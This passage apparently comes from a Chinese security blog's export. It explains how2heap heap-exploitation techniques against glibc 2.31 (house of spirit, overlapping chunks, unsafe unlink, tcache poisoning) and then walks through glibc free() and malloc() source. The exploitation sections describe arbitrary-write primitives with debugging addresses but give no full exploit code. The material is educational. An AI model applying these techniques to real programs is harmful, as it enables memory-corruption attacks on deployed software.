fake chunk 的 size 是 0x40，这个是 chunk 的大小，chunk 的前两个字段需要存储 prev_size 与 chunk，因此 0x40 大小的 chunk 实际容量是 0x30。那么我们申请 0x30 大小的内存时，就会分配给我们一个 0x40 大小的 chunk 当然，我还需要补充一点，虽然 0x40 大小的 chunk 实际容量是 0x30，但是 chunk 的 prev_size 是一个很有意思的字段，如果 prev_chunk 处于 inuse 状态下，那么这个字段将会用于存放 prev_chunk 的数据。换句话说，下一个 chunk 的 prev_size 字段，也可以拿来用，这个字段在 64 位系统上占 0x8 个字节。那么，如果我申请一个 0x38 大小的空间， 也只会分配给我一个 0x40 大小的 chunk，因为 0x30 的空间来源于分配的 chunk 容量，还有 0x8 字节来源于下一个 chunk。那么就会有人说了，我申请 0x30 字节的空间，为什么不能分配一个 0x38 大小的 chunk，其中 0x28 来源于 chunk，0x8 来源于下一个 chunk，这当然是不行的，因为在 64 位系统上 chunk 本身要按照 0x10 字节对齐 明白了上面的原理，就能清楚这里为什么 malloc 一个 0x30 字节大小，这是为了让指针 b 获取到之前 free 掉的 0x40 大小的 fake chunk，如下图所示，b 指针会指向 fake_chunk[2] 的位置 执行分析 根据执行信息，这里可以看到 fake_chunk[1] 与 fake_chunk[2] 的位置，分别对应 fake_chunk 的 size 和返回给用户的指针，不过这里看的不明显，还是从调试角度看看 调试分析 fake_chunk 初始在栈中，fake_chunk[1] 被赋值给 0x40，地址为 0x7fffffffdd18。根据前面的推论，可以得知： 首地址为 0x7fffffffdd10 的 chunk 会进入 tcache bin，由于 tcache bin 是通过 fd 访问的，所以进入后链入的位置是 0x7fffffffdd20 地址 0x7fffffffdd20 除了作为 fd 存在，同样也是返回给用户的地址，即经过 malloc() 申请的得到的地址 经过 free 后进入 tcache bin 的地址为 0x7fffffffdd20 经过 malloc() 后得到地址 0x7fffffffdd20，即 fake_chunk[2] 的地址 与执行分析的结果不同，是因为默认开启了 ASLR 原理小结 本例演示了经典的 house of spirit 场景，通过伪造 chunk 实现任意地址写入 由于 glibc2.26 开始引入了 tcache，house of spirit 也增加了 tcache 的应用场景 原理通过伪造一个 chunk，并将其 free，使得之后的用户可以申请到我们伪造的 chunk，该 chunk 的地址可以是任意的，本例中以栈空间中的地址为例进行了演示 overlapping_chunks源码分析这个源码有点长，就不分析完整版了。这里删除些不影响程序执行的描述性语句，弄个简化版来分析 完整版 简化版 橙色方框： 先用 malloc() 申请了 3 个块，然后将这三个块填充为 1、2、3 之所以申请的大小是 0x80 - 8、0x500 - 8 这种形式，在前面讲 tcache_house_of_spirit 是已提及，就是当一个 chunk 处于 inuse 状态时，它是可以使用下一个 chunk 的 prev_size 位来存储数据的，所以例如，p1 申请了 0x78 字节的空间，那么最终分配给它的是一个大小为 0x80 字节的 chunk。这一顿操作完，堆中的情形大致如下（注意：这里是为了演示方便，因此每个块只标了 4 字节，实际应该是 8 字节）： 蓝色方框： 设置了俩值，其中 evil_chunk_size，设置为了 0x581，也就是 p2 + p3 这两个 chunk 的大小 evil_region_size 则用于 malloc() 的参数，申请一个 0x580 - 8 的内存，最终会被分配 0x580 大小的 chunk 红色方框： 这里先修改了 p2 的 size 位为 0x581，然后将其 free，这样进入 large bin 的就是一个 0x580 大小的 chunk 当再次申请一个 0x580 大小的块时，large bin 中刚好有一个，就会将这个 chunk 返回给用户 这里 p4 拿到的就是这个 0x580 大小的块，下图红色区域框出了 p2 与 p4 对应 chunk 的范围，这里可以明显看出，p4 与 p2 的起始地址一样，但是 p4 包含了 p3 区域（注意：这里是为了演示方便，因此每个块只标了 4 字节，实际应该是 8 字节） 粉色方框： 这部分主要对比观察 p4、p3 所指区域覆盖前后的变化 由于 p4 包含了 p3 的区域，所以结果会比较明显 执行分析由于源码很长，并且示例中申请了一个 large bin chunk， 执行结果也比较长，截图也分为两部分： 从这部分的执行结果来看，p2 与 p4 起始地址相同，p4 则与 p3 的结束地址相同 这部分就是对 p4，p3 执行 memset() 前后的对比了，可以看出来，由于 p4、p3 占了同样的空间，所以覆盖 p3 的区域，会直接影响到 p4 区域 调试分析这部分的示例代码写的很细，通过执行结果就可以验证源码分析时的推论了，因此就不再进行调试分析了 原理小结 本例通过修改 chunk 的 size 来实现与后向的 chunk 合并，此修改操作可通过前向的 chunk 溢出来实现 chunk 合并会而导致新申请的内存块与先前申请的内存块存在相同的区域，可能是包含关系，从而可以通过修改旧内存块中的值来影响新申请的内存块 unsafe_unlink源码分析完整版 简化版 橙色方框： 本例实现了一个任意地址写入，写入的这个地址就是这里定义的全局变量 chunk0_ptr 所在的地址，即 &chunk0_ptr 全局变量与局部变量不同，局部变量位于栈中，全局变量位于堆中，这里的 chunk0_ptr 是一个指针，会指向一个地址，而这个指针自己，也位于堆中的某个地址 可以通过 chunk0_ptr 或者 chunk0_ptr[0] 来访问 chunk0_ptr 所指向内存区域的第一个元素 可以通过 &chunk0_ptr 来访问 chunk0_ptr 这个全局变量指针所在的地址 通过 malloc() 申请了两个 0x420 大小的空间，获取两个 0x430 大小的 chunk，目前的情况大概如下图所示： 蓝色方框： 修改 chunk0_ptr 区域中的内容，伪造了一个包含 size、fd、bk 字段的 fake chunk 需要注意这里用到了 &chunk0_ptr 附近的地址作为 fd、bk 的值，在下图中标出 其实这波操作很秀，根据下图的情况，我们可以发现，fake_chunk->fd->bk == chunk0_ptr 并且 fake_chunk->bk->fd == chunk0_ptr。这样在进行 unlink 时就可以过掉双链表完整性的校验了 为了防止以后忘记，这里再提一嘴，假设 p 指向一个 chunk 的开头。那么 p->fd 就是找 p + 2xSIZE_SZ 的位置处的值，p->bk 就是找 p + 3xSIZE_SZ 处的值。理论上这两处的值都是一个指针，指向另一个 chunk 修改 chunk1_ptr 中的 prev_size 字段，使得 chunk1_ptr 的前一个 chunk 成为先前伪造的 fake chunk，并设置 fake chunk 为 free 状态 红色方框： 这是对 chunk1_ptr 执行的一次 free 操作，但是涉及到的东西很多 由于上一步将 chunk1_ptr 的 prev_inuse 设置为了 0，因此在 free 一个非 fast bin 大小的 chunk 时，会触发对前一个 chunk（正是先前伪造的 fake chunk） 的合并，其中会对前一个 chunk 进行 unlink_chunk() 操作，参考下图中部分 _int_free() 相关的源码 图中已圈出关键的链表操作代码，断链时的语句可以简单概括如下： p->fd->bk = p->bk p->bk->fd = p->fd 然而，此处： p->fd->bk == p->bk->fd == chunk0_ptr &(p->fd->bk) == &(p->bk->fd) == &chunk0_ptr 所以这里执行的 unlink_chunk() 操作，最终就是先将 p->bk 的值写入 &chunk0_ptr，再将 p->fd 的值写入 &chunk0_ptr，将前面写入的值覆盖掉。这个过程大致如下图（图只是给个印象，不完全对，因为 chunk1_ptr 是第二个申请的，后面也没有别的申请的块了，所以大概率会在后向合并时被 top chunk 给合并，我这里画出来的是完成 unlink_chunk() 后的状态，而不是 free() 执行完后的状态，所以调试时看到的图会与这里的有所出入）： 粉色方框： 最后这一步，有点绕，如果不去调试是看不出来的，因为平时指针可能都是作为局部变量放在栈中，是通过 rsp/rbp 进行寻址的，这里不一样，它需要先获取到全局变量的地址，这个全局变量的地址里面的值，保存的正是指针所指向的地址 具体来说就是它在给 chunk0_ptr[3] 赋值的时候，不是像我们所理解的那样，直接在 chunk0_ptr[3] 的位置去赋值 而且先访问 &chunk0_ptr，这是全局变量指针的地址， &chunk0_ptr 这个地址保存的值正是 chunk0_ptr 指针所指向的地址 这里 &chunk0_ptr 处保存的值因为 unlink_chunk() 已经被修改为了 &chunk0_ptr - 3xSIZE_EZ，所以此时我们访问 chunk0_ptr[3] 就会变成这样： chunk0_ptr[3] == &chunk0_ptr - 3*SIZE_EZ + 3*SIZE_EZ == &chunk0_ptr 也就是说，此时 chunk0_ptr[3] 所指的位置与 &chunk0_ptr 所指的位置是一样的，这点有点绕，慢慢理解 然后赋值，给赋了一个字符串的地址，这里用 &string 表示，此时 &chunk0_ptr 处的值又变成了字符串的地址 &string，也就是说此时 chunk0_ptr 指向的是字符串 最后再给 chunk0_ptr[0] 进行赋值，根据第 3 步说的，这里 chunk0_ptr[0] 其实是 &string[0]，因此就是在改刚刚赋值的字符串，因此最后会发现字符串变了。这里的操作已经和 chunk0_ptr 原本指向的堆空间没什么关系了，因为它现在已经指向了自身这个全局变量所在的堆空间中 执行分析 这题的描述写的不够细，但仍然可以看出 2 点： 伪造的 fake chunk 的 fd/bk 指向 &chunk0_ptr 附近，即这个全局变量指针所在堆空间的附近，而不是它指向的堆空间附近 字符串可以被覆盖 调试分析 第一次 malloc()后： malloc() 申请到的地址为 0x5555555592a0 全局变量指针的地址为 0x555555558020，虽然全局变量地址是固定的，但它每次会通过 RIP + 偏移的形式计算得来 在 malloc() 获取到申请的地址后，会将其赋值给全局变量指针 printf() fake chunk bk 后： 选择这里是因为，此时 fake chunk 已经伪造好了 可以看到 fake chunk 相比原先 chunk0_ptr 所指的位置后移了 0x10 原先指向 0x00005555555592a0，chunk 位于 0x0000555555559290，现在 chunk 位于 0x00005555555592a0 同时设置了 fd 为 0x0000555555558008，bk 为 0x0000555555558010 然后往上看，会发现 fd 和 bk，这两处目前都有值，但这不重要，因为这两个处的值理应是 prev_size 才对 然后会发现 fd->bk 刚好是 0x00005555555592a0，bk->fd 也是 0x00005555555592a0，所以就可以过掉 unlink_chunk() 时对链表完整性的一次 check 了 free() 执行后： 先看橙色框，这个值很大，说明一点，chunk1_ptr 在被 free 后，先和我们伪造的 fake chunk 合并了，然后又直接和后面的 top chunk 合并了，因此 fake chunk 直接成为了新的 top chunk 红色框比较关键，它的值为 chunk0_ptr 指向的地址，原本这个值指向了 0x00005555555592a0，也就是一开始 malloc() 获得的地址，现在它指向了 0x0000555555558008，之所以会这样，是因为在 unlink_chunk() 中先后执行了： fd->bk = bk bk->fd = fd 前面已经提到过 fd->bk 与 bk->fd 是相等的，这个位置就是 0x0000555555558020 这个地址，也就是说，先后给 0x0000555555558020 这个地址赋值 bk 与 fd，fd 则是 0x00005555555592b0 处的值，也就是 0x0000555555558008。所以此时 0x0000555555558020 处的值就被修改为了 0x0000555555558008 为什么说这步很关键呢？因为 0x0000555555558020 存的是 chunk0_ptr 这个指针指向的地址，此时这个值为 0x0000555555558008，那么接下来我们要访问 chunk0_ptr[0] 也就是访问 0x0000555555558008，访问 chunk0_ptr[3] 也就是访问 0x0000555555558020 赋值 chunk0_ptr[3] 后： 可以看到给 chunk0_ptr[3] 赋值，其实就是给 0x0000555555558020 赋值，此时赋值为字符串的地址 此时 0x0000555555558020 的值已经修改为了 0x00007fffffffdd70 那么接下来若给 chunk0_ptr[0] 赋值，就是给 0x00007fffffffdd70 处赋值，若给 chunk0_ptr[3] 赋值，就是给 0x00007fffffffdd88 赋值 赋值 chunk0_ptr[0] 后： 从这里也可以看出，当我们再次尝试给 chunk0_ptr 赋值时，其实就是给字符串所在的地址赋值，这样就实现了修复字符串的操作，正如执行结果中显示的那样 原理小结 通过在一个正常申请的 chunk 中伪造一个空闲状态的 fake chunk（可通过溢出实现），使得在 free 过程中可将其合并 合并时会调用 unlink_chunk()，该函数会使用伪造的 fd 影响原先指针的值 若对原先的指针进行新的赋值（例如一个地址），则可在后续操作中对这个地址进行写入，从而达到任意地址写入的操作 本例是这一篇中最难理解的，核心在于对访问指针指向元素过程的了解，必要时仍需调试弄明白执行细节 tcache_poisoning源码分析 橙色方框： 先 malloc() 2 个能容纳 0x80 大小的空间，再将它们先后释放到 tcache 中，由于 b 是后释放的，所以 tcache 中排布大致为：tcache -> b -> a 红色方框： 将 b[0] 设置为局部变量 stack_var 在栈中的地址，实际作用是修改 tcache_entry->next 为 stack_var 的地址，此时 tcache 中排布为：tcache -> b -> &stack_var 蓝色方框： 先 malloc() 一次，把 b 申请走，然后再 malloc() 一次，此时获取到的不是 a 而实 &stack_var 执行分析 执行结果很清晰，不多讲了，结合源码很容易看明白 调试分析 两次 free() 后： 修改 tcache_entry -> next 后： 这里原本 a 对应的 chunk 被修改为了栈中的地址 在申请完 0x555555559330 后，再申请就会申请到这个地址 原理小结 原来很简单，UAF 的手法修改 tcache，实现将 tcache 中的某个 chunk 修改为任意地址 但是从 glibc2.32 开始，增加了 PROTECT_PTR 保护机制，需通过找到一个 0x10 对齐的地址，仍可以实现任意地址写入，本篇基于 glibc2.31 进行分析，故对此机制不进行展开 参考链接 看雪：how2heap深入浅出学习堆利用 Github：shellphish/how2heap","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"堆基础03：free源码分析","slug":"堆基础03-free源码分析","date":"2022-08-08T01:27:58.000Z","updated":"2022-08-09T13:44:43.083Z","comments":true,"path":"2022/08/08/堆基础03-free源码分析/","link":"","permalink":"http://cata1oc.github.io/2022/08/08/%E5%A0%86%E5%9F%BA%E7%A1%8003-free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"前言前一篇基于 64 位操作系统，对 glibc2.31 源码中 malloc 的部分进行了详细分析，本篇衔接前一篇接着 free 部分的源码分析 __libc_free 主流程__libc_free() 的流程不复杂，这里圈出 4 个部分来看，以看的更为清晰： 红色方框： 这部分是针对 hook 函数的处理，若存在则调用 hook 函数并返回；从 glibc2.34 版本开始，此处的 hook 处理已被删除 橙色方框： 第一处判断 mem == 0，实际上是对 free(0) 情况的处理；接下来调用宏 mem2chunk 将需要被 free 的指针转换为 chunk 的首地址，以方便后续处理 蓝色方框： 这部分主要是进行映射内存（mapped memory，即通过 mmap() 系统调用申请的内存）释放的处理，若开启了 mmap() 分配阈值动态调整机制（no_dyn_threshold 值为 0），则会根据 释放的内存大小动态调整 mmap 分配阈值（mmap_threshold）与 top chunk 的收缩阈值（trim_threshold） 绿色方框： 先调用 MAYBE_INIT_TCACHE 判断 tcache 是否存在，若不存在则进行 tcache 初始化，调用 arena_for_chunk 获取需要释放的 chunk 所在的分配区，然后调用 _int_free() 完成对该 chunk 的释放，此时传入的参数 p 为需要释放的 chunk _int_free 主流程初始校验_int_free() 有 3 个参数，av 是 chunk 所在的分配区，p 是 chunk 的首地址，have_lock 是个锁标志，默认为 0。进入函数后先获取 chunk 大小，然后进行一系列 check： check 1： (int(p) > int(-size)) == 0，翻译过来就是 chunk 的地址不能比负的 size 大，size 往往是一个相对较小的数，例如 0x20，取负后就会变成一个很大的数，例如 0xffffffE0，在 Linux 进程地址空间中，这样的地址属于内核地址，若 chunk 地址在这个范围，很可能是被覆盖了，因此会进行报错处理 chunk2mem(p) & 0xf == 0，这里我简化了这个宏，0xf 实际上是 SIZE_SZ * 2 - 1 的结果，这个值在 64 位下就是 0xf。经过 chunk2mem 则是获取原本指针的值，这个值经过 chunk地址 + 2*SIZE_SZ 计算的结果，而 chunk 地址本身是按照 SIZE_SZ*2 进行对齐的，因此经过 chunk2mem 计算后的地址，也应该是按照 SIZE_SZ*2 对齐的，那么该值在和 0xf 进行与运算时，得到的结果应该为 0，若不为 0，说明 chunk 地址未对齐，则应报错 check 2： size < MINSIZE，将要释放的 chunk 大小比 chunk 最小分配的大小 MINSIZE 还要小，显然是出错了 aligned_OK(size) == 0，这个和上面的 check 类似，只不过这个是对 size 的对齐进行 check，上面那个是对 chunk 地址对齐进行 check check 3： check_inuse_chunk，这个宏会进一步调用do_check_inuse_chunk()，该函数会检查 chunk 是否为正在使用的，即检查该 chunk 的后一块的 prev_inuse 位进行判断，防止 double free 的情况发生 Tcache 处理流程如果开启了 tcache（glibc2.31 中默认开启），则会进入下面的代码块： 外层 check： 判断 tcache 是否已初始化 判断 tc_idx 是否在 tcache bin 数目的范围内（tcache bin 最多有 64 个，因此经过 csize2tidx 计算得到的值应小于 64） 若满足上述两个条件，则调用 chunk2mem 获取这个将要被 free 掉的 chunk 的 tcache_entry，为什么要这么做？因为 tcache_entry 本身就是 malloc_chunk 结构体，当 chunk 进入 tcache bin 中后，它使用了 malloc_chunk 结构体的 fd/bk 两个字段。 这里通过 chunk2mem 获取到 malloc_chunk 结构体的 fd 所在的地址，刚好就是当前 chunk 对应的 tcache_entry 的地址。可参考下面关于 tcache 结构关系的这张图。获取到 tcache_entry 后可用于接下来的判断。 内层第一个 check： 判断 e->key 是否等于 tcache 首地址 在通过 tcache_put() 将 chunk 放入 tcache bin 的过程中，会将 chunk 对应的 bk 字段（即 tcache_entry->key 字段）设置为 tcache 的首地址，这里若相等，说明该 chunk 可能已经进入 tcache bin 中，若继续释放可能会造成 double free。不过这里为了排除因为随机有效载荷的干扰，会进一步遍历该 tc_idx 对应的 tcache bin 上的所有 chunk，判断是否与当前将要释放的 chunk 相等，来确保结果的严谨 内层第二个 check： 判断 tc_idx 对应的 tcache bin 中 chunk 的数量是否小于最大值 tcache bin 中最多包含 7 个相同大小的 chunk，若当前 tcache bin 中 chunk 的数量低于 7 个，那么 free 掉该大小的 chunk 就会进入该 tcache bin 中。这里若能通过该判断，则会调用 tcache_put() 将 chunk 放入该 tc_idx 对应的 tcache bin 中 Fast Bin 处理流程check 部分如果对应大小的 tcache bin 满了，就会执行到这，这里是对 fast bin 处理的逻辑，可以分为两个部分来看，先来看 check 部分： 外层 check： 要 free 的 chunk 的大小是否位于 fast bin 范围内 开启了 TRIM_FASTBINS 模式下（默认为 0，不开启），则该 chunk 不能紧挨着 top chunk 满足上述条件，则进入 fast bin 处理流程 内层 check： chunk 不能小于 MINSIZE chunk 不能大于 system_mem 这俩属于对于 size 的常规检测，之前的分析中已经多次遇到。只是这里它处理的会更严谨些，为了排除多线程的干扰，会给 chunk 所属的分配区上锁后，重新进行一次判断，若这次判断还是出问题，则说明 size 确实是个非法的值，然后报错退出 free 部分 free_perturb() 实现了一个 memset 操作，前提是需要设置用于填充缓冲区的值 perturb_byte，该值默认为 0，故不会进行 memset 操作，所以这里可以忽略 atomic_store_relaxed() 我没弄明白这个函数是干嘛的，在 glibc2.23 版本中，这里的语句是 set_fastchunk(av)，用来初始化 fast bin，所以我感觉这里起到的功能应该类似吧 接下来拿到要被 free 的 chunk 在 fast bin 中的 idx 以及对应 bin 的链表头，然后开始进入 fast bin： 对于单线程的情况，直接用头插法将 chunk 放到链表头所指向的位置，到时候分配的时候，也是优先分配这个位置，因此 fast bin 是先进后出（FILO） 对于多线程的情况，则是通过 lock-free 的技术实现单向链表链入第一个 node 的操作，本质上和单线程的处理方式一致 上述两种情况，都会根据链入的 chunk 和原先该位置的 chunk 是否一致，来判断是否出现 double free 的情形 最后有一个 check，判断我们插入的 chunk 与原先顶部的 chunk 大小是否一致，因为 fast bin 要求每条 bin 上的 chunk 大小相同。不过这个 check 仅在分配区上锁的情况下才会进行 Bins 处理流程check 部分 这里的 else if 对应前面 fast bin 判断处的 if 以及最末尾处的一个 else，逻辑如下： if： 在 fast bin 范围内，进入 fast bin 处理流程 else if： 不是通过 mmap() 系统调用申请的内存，则进入 bins 处理流程（unsorted bin，small bin，large bin 都位于 bins 中） else： 直接调用 munmap_chunk() 释放 chunk 进入 else if 语句，开始会对单线程 / 多线程进行判断，如果是多线程的场景，需要对分配区进行加锁。然后通过 chunk_at_offset 获取到后一个 chunk 的地址 接下来是一系列 check： check 1： p == top chunk，top chunk 只会被分割，不会处于 inuse 状态，若 free 的是 top chunk，说明出错了 check 2： contiguous(av)，参考了xi@0ji233师傅，他说这里是检查分配区上的 flags nextchunk...，下面这个校验太长了就不写了，主要是判断 nextchunk 的首地址，是否超过了 top chunk 的边界，若超过了，说明要被 free 的 chunk 自身的数据区也超过了 top chunk 的范围，也就出错了 check 3： prev_inuse(nextchunk) == 0，这个就是判断自己是不是在使用中，因为此时还没进行 free，nextchunk 的 prev_inuse 应该设置为 1，若该值为 0，说明这个 chunk 已经是 free 状态了，就可能造成 double free check 4： 这里主要是对 nextchunk 的 size 进行 check，前文已多次出现，目的是防止在向后合并时出现问题 最后调用 free_perturb() 进行 memset，当然，还是大概率不会执行 向前合并 这里的逻辑是尝试（当前一个 chunk 处于 free 状态时就会进行合并）将当前 chunk 与前一个 chunk 进行合并，然而注释的英文却是 consolidate backward，不过无所谓，能理解它的意图就行，这里作简单解析： 通过当前 chunk 拿到 prevsize 将当前 chunk 的 size 与 prevsize 相加 将当前 chunk 的首地址设置为前一个 chunk 的首地址，这样就相当于合并了，不过此时还没有修改合并后 chunk 的 size 字段 检查一下前一个 chunk 合并前的大小 调用 unlink_chunk() 将前一个 chunk 从链表（bins 上的链表都有可能）上断链，最后再注意一点，若发生了合并，此时的当前块，已经为合并后的 chunk，但是该 chunk 的 size 字段此时暂未修改 向后合并 首先先判断后一个块是不是 top chunk： 如果是，进入 else 语句，直接修改当前块为 top chunk，然后设置 top chunk 的 size 为合并后的 size，设置分配区的指向新的 top chunk 地址 如果不是，那么判断一下 nextchunk 是否是 inuse 的： 如果是 inuse 的，那么将 nextchunk 的 prev_inuse 设置为 0，意思是不合并 nextchunk 了，并告诉 nextchunk 你前面的块是 free 的 如果不是 inuse 的，将 nextchunk 断链，然后将 nextsize 加到 size 上，表示 nextchunk 也要加入合并 接下来，将合并后的 chunk 链入到 unsorted bin 中，并根据情况设置 size，prev_size，fd_nextsize，bk_nextsize 等字段 堆收缩 首先判断释放的内存大小是否超过了阈值 FASTBIN_CONSOLIDATION_THRESHOLD（0x10000）， 如果没超过，则不作处理 如果超过了，那么会先触发 fast bin 合并机制 若 fast bin 存在，则调用 malloc_consolidate() 将 fast bin 进行合并 然后作进一步判断： 如果 free 的 chunk 位于主配分区（main_arena），且未设置 MORECORE_CANNOT_TRIM（不允许收缩内存），且 top chunk 的大小超过了 top chunk 的收缩阈值，那么就会调用 systrim() 收缩内存 如果 free 的 chunk 位于非主分配区（thread_arena），那么找到分配区（malloc_state）对应的堆（heap_info），然后调用 heap_trim() 收缩堆 最后判断一下如果是多线程的 free 情形，则将先前对分配区加的锁给去掉 参考链接 看雪：malloc源码分析 看雪：how2heap深入浅出学习堆利用","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"堆基础02：malloc源码分析","slug":"堆基础02-malloc源码分析","date":"2022-07-16T06:31:48.000Z","updated":"2022-08-07T11:52:44.972Z","comments":true,"path":"2022/07/16/堆基础02-malloc源码分析/","link":"","permalink":"http://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"前言前一篇已经介绍了 ptmalloc2 的分配策略以及涉及到的主要数据结构，本篇将基于 glibc.2.31 源码，分析 malloc在源码中的具体实现。主要参考博客园上的一篇基于 glibc2.31的源码分析，以及看雪上一篇基于 glibc2.23 的源码分析。分析过程与之前分析 AFL 源码一样，按照执行的先后顺序来。 源码调试 按照官网的方式下载安装 网速慢，可下载 zip 包后，解压到指定目录下，然后配置~/.gdbinit文件即可 要进行源码调试，需在官网下载对应版本的源码，然后在~/.gdbinit中配置源码所在路径，我这里只配置常用的源码 配置完后，用 gdb 调试程序，start 启动后会在程序入口断下，单步（si指令）到库函数例如 malloc 中，就可以看到源码了，如下图所示 我这里直接在 vscode 的 terminal 中调试，没用 ubuntu 自带的 terminal，这样方便查看源码。尽管已经是源码调试，但 terminal 中只能看到源码片段，并不完整，所以还是需要有源码进行辅助 __libc_malloc 主流程 首先编写一个会使用到 malloc / free 的简单程序： 用 pwndbg 结合源码进行单步调试，si单步到 malloc 中，进入下图所示的状态 DISASM：反汇编窗口显示经过 .plt 表中的 stub 代码后，跳转到了 malloc 函数真正开始的地方 SOURCE：源码窗口，可以看到目前位于 __libc_malloc() 函数的开始处 BACKTRACE：调用栈窗口显示，此时进入了 malloc 函数中执行 综上，可以分析得出，在程序进入 malloc 函数后，最先执行的函数为 __libc_malloc() 接下来，开始分析 __libc_malloc()，这里会先分析主体流程，涉及到的其它函数与宏，会先简要概括，并在后文根据情况适当展开，我们先来看第一部分： mstate 类型对应的结构体是 malloc_state，其作用相当于 Arena Header 判断是否存在 __malloc_hook，若存在则调用该 hook 函数并返回。值得注意的是，在 2.34 版本中，malloc_hook 同其它大部分的 hook 都被删除了 atomic_forced_read(x)这个宏的作用相当于 *ptr，只不过是原子操作 若开启了 tcache 机制（默认开启），则： 调用 checked_request2size() 判断申请的空间大小是否超过边界。若未超过边界，则根据申请的大小计算出需要分配的 chunk 大小，该值保存在传入的 tbytes 参数中 调用csize2tidx()根据 tbytes 中指定的 chunk 大小找到对应的 tcache bin 下标 若 tcache 还未创建，则通过宏MAYBE_INIT_TCACHE调用tcache_init()来初始化 tcache 接下来进行 3 项判断，若都满足，则调用tcache_get()返回对应大小的 chunk： 先前计算出的下标是否在 tcache bins 范围内（这里的 mp_ 对应的结构体是 malloc_par） tcache 是否存在 下标所对应的 tcache bin 中是否仍有空闲的 tcache chunk 接下来分析libc_malloc()的第二部分： 首先处理单线程的情况： 调用_int_malloc()函数分配内存，该函数是内存分配的最核心函数，后面会对其进行分析。 main_arena：由于是单线程，所以只有一个主分配区。其为 malloc_state 结构体，在第一次申请时可能值为 NULL，在_int_malloc()内部会对其进行初始化 bytes：也就是申请的字节数了，注意这里的 bytes 是外层在 malloc 中传入的申请的字节数，尚未转换成需要申请的 chunk 大小 如果执行成功的话，就会返回一个指向内存的指针。本质上，这个指针指向分配的 chunk 中存放数据的首地址，也就是 chunkaddr + 2 * SIZE_SZ 的位置 然后是多线程的情况： 首先调用arena_get()获取分配区 然后通过_int_malloc()从该分配区中拿到分配给咱的内存地址 如果成功获取分配区，但是分配内存失败，可能是 mmap 区域的内存耗尽等多种原因。所里会调用arena_get_retry()更换分配区，然后再调用_int_malloc从新的分配区上进行分配 前面两次无论是否分配成功，只要获取到了分配区，这里就会将线程锁释放。这个锁是在获取空闲分配区时加上的。在前面两次试图获取或者更换分配区时，会在不同情况下进行上锁，这个后面会讨论 最后将指向分配内存的指针返回给用户 至此，__libc_malloc()的主体流程分析完毕 __libc_malloc 辅助函数这部分会对在分析__libc_malloc()时见到的几个关键的”函数 / 宏”展开分析，部分函数也在_int_malloc()中被调用，因为首次出现在__libc_malloc()中，所以放在此处分析，在后面分析_int_malloc()时也是如此 checked_request2size 首先来看checked_requeset2size() 首先判断申请的内存大小是否超过了边界 PTRDIFF_MAX，这个在 64 位系统上是 0x7fffffffffffffff 如果符合要求，就调用request2size()这个宏，根据申请申请大小 req，计算出需要分配的 chunk 大小返回给 sz，并返回 true 然后进入request2size()，这里涉及到的宏均已经列出，其中 SIZE_SZ，根据系统位数变化，64 位对应 8 字节，32 位对应 4 字节。我们默认环境是 64 位的，所以都以 8 字节进行计算 MALLOC_ALIGNMENT 是 2 个 SIZE_SZ 的大小，就是 0x10 字节 MALLOC_ALIGN_MASK 就是 15 字节，也就是 0xF MIN_CHUNK_SIZE 是从 malloc_chunk 结构体开头，到 fd_nextsize 这个字段之前的大小，也就是 4个 SIZE_SZ，共 32 字节，即 0x20 MINSIZE 算出来也是 0x20 字节 c123-> (0x20 + 0xF) & (~0x0F)-> 0x2F & 0xF0-> 0x20 最后计算出 request2size() 的两种情况： 当申请的内存少于 25(0x19) 字节时，分配一个 0x20 大小的 chunk 块。这个值可以根据 malloc_chunk 结构体推算出，因为 fd & bk 这俩字段仅在 free_chunk 中有效，否则用于存放数据，并且当 chunk 被使用时，下一个 chunk 的 prev_size 字段也可以用于存放当前 chunk 的数据，这 3 个字段加起来就是 24 字节，因此，当申请的空间小于 25 字节时，一个最小 chunk （0x20）即可满足需求 当大于等于 25(0x19) 字节时，就会计算出一个按照 0x10 对其的值，作为至少需要分配的 chunk 大小，具体算法参考下面的计算过程 c12345678910-> req + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE-> req + 0x8 + 0xF < 0x20-> req < 0x20 - 0x8 - 0xF-> req < 0x9 // 为方便理解，这里假设req是一个小于0xFF的数 -> (req + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK-> (req + 0x8 + 0xF) & ~0x0F-> (req + 0x17) & 0xF0-> (req + 0x30 - 0x19) & 0xF0 csize2tidx 这里的参数 x，正是前request2size()这个宏计算出的实际需要分配的 chunk 大小 MALLOC_ALIGNMENT 是 2 个 SIZE_SZ 的大小，就是 0x10 字节 MINSIZE 前面也算出来是 0x20 字节 下面进行一个简单的演算，假设 x 的值为 0x30 字节 c12345-> (x - MINSIZE + MALLOC_ALIGNMENT - 1) / 0x10-> (0x30 - 0x20 + 0x10 - 1) / 0x10-> (0x10 + 0xF) / 0x10-> 0x1F / 0x10-> 1 此时得到的 idx 值为 1，我们知道 idx 是从 0 开始的，最小的 tcache bin chunk 大小是 0x20 字节。因此可以得出chunksize = 0x20 + idx * 0x10，这个 chunksize 就是需要分配的 chunk 大小，这样就会好理解很多 MAYBE_INIT_TCACHE 先看 3006 行，这里MAYBE_INIT_TCACHE宏内部调用了tcache_init() 回到 2972 行，我们来看tcache_init()的内部实现 首先计算出 tcache_perthread_struct 结构的大小，然后为其分配空间 分配空间的过程和__libc_malloc()中类似，为了防止套娃这里只分析最外层的函数 调用arena_get()获取分配区，然后通过_int_malloc()从该分配区分配内存 如果分配区存在但没分配到，那就调用arena_get_retry()换个分配区再分配 分配完成后调用__libc_lock_unlock释放分配区，这是因为在获取分配区或者更换分配区时会进行上锁操作 最后将申请到的内存赋给 tcache_perthread_struct 结构，再调用memset()将内容初始化为0 tcache_get方才在__libc_malloc()中提到，如果满足一定条件，则通过tcache_get()获取到一个 chunk，传入的参数是经过宏csize2tidx算出来的所在 tcache bin 的 idx，下面来看这个函数： 先根据 idx 找到对应的 tcache bin 的第一个 tcache_entry，也就是这条 bin 上的第一个 chunk 块 将这条 tcache bin 上的第一个 tcache_entry 修改为当前 